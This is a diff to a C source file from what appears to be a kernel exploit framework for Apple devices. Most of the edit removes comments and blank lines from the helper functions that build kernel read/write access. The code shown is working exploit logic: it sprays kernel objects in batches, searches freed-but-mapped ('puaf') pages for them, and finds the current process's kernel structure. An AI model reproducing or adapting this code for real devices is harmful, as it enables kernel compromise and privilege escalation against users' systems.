@@ -31,7 +31,6 @@
 #include "krkw/kwrite/kwrite_dup.h"
 #include "krkw/kwrite/kwrite_sem_open.h"
 
-// Forward declarations for helper functions.
 void krkw_helper_init(struct kfd* kfd, struct krkw* krkw);
 void krkw_helper_grab_free_pages(struct kfd* kfd);
 void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw);
@@ -100,10 +99,6 @@ void krkw_free(struct kfd* kfd) {
     krkw_helper_free(kfd, &kfd->kwrite);
 }
 
-/*
- * Helper krkw functions.
- */
-
 void krkw_helper_init(struct kfd* kfd, struct krkw* krkw) {
     krkw->krkw_method_ops.init(kfd);
 }
@@ -112,10 +107,8 @@ void krkw_helper_grab_free_pages(struct kfd* kfd) {
     const u64 copy_pages = (kfd->info.copy.size / pages(1));
     const u64 grabbed_puaf_pages_goal = (kfd->puaf.number_of_puaf_pages / 4);
     const u64 grabbed_free_pages_max = 400000;
-
     for (u64 grabbed_free_pages = copy_pages; grabbed_free_pages < grabbed_free_pages_max; grabbed_free_pages += copy_pages) {
         assert_mach(vm_copy(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size, kfd->info.copy.dst_uaddr));
-
         u64 grabbed_puaf_pages = 0;
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
@@ -132,31 +125,16 @@ void krkw_helper_grab_free_pages(struct kfd* kfd) {
 
 void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw) {
     const u64 batch_size = (pages(1) / krkw->krkw_object_size);
-
     while (true) {
-        /*
-         * Spray a batch of objects, but stop if the maximum id has been reached.
-         */
         bool maximum_reached = false;
-
         for (u64 i = 0; i < batch_size; i++) {
             if (krkw->krkw_allocated_id == krkw->krkw_maximum_id) {
                 maximum_reached = true;
                 break;
             }
-
             krkw->krkw_method_ops.allocate(kfd, krkw->krkw_allocated_id);
             krkw->krkw_allocated_id++;
         }
-
-        /*
-         * Search the puaf pages for the last batch of objects.
-         *
-         * Note that we make the following assumptions:
-         * - All objects have a 64-bit alignment.
-         * - All objects can be found within 1/16th of a page.
-         * - All objects have a size smaller than 15/16th of a page.
-         */
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
             u64 stop_uaddr = puaf_page_uaddr + (pages(1) / 16);
@@ -168,28 +146,21 @@ void krkw_helper_run_allocate(struct kfd* kfd, struct krkw* krkw) {
                 }
             }
         }
-
         krkw->krkw_searched_id = krkw->krkw_allocated_id;
-
         if (maximum_reached) {
 loop_break:
             break;
         }
     }
-
-    timer_end();
     const char* krkw_type = (krkw->krkw_method_ops.kread) ? "kread" : "kwrite";
-
     if (!krkw->krkw_object_uaddr) {
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
             print_buffer(puaf_page_uaddr, 64);
             break;
         }
-
         assert_false(krkw_type);
     }
-
     if (!kfd->info.kaddr.current_proc) {
         krkw->krkw_method_ops.find_proc(kfd);
     }
@@ -200,14 +171,12 @@ void krkw_helper_run_deallocate(struct kfd* kfd, struct krkw* krkw) {
         if (id == krkw->krkw_object_id) {
             continue;
         }
-
         krkw->krkw_method_ops.deallocate(kfd, id);
     }
 }
 
 void krkw_helper_free(struct kfd* kfd, struct krkw* krkw) {
     krkw->krkw_method_ops.free(kfd);
-
     if (krkw->krkw_method_data) {
         bzero_free(krkw->krkw_method_data, krkw->krkw_method_data_size);
     }
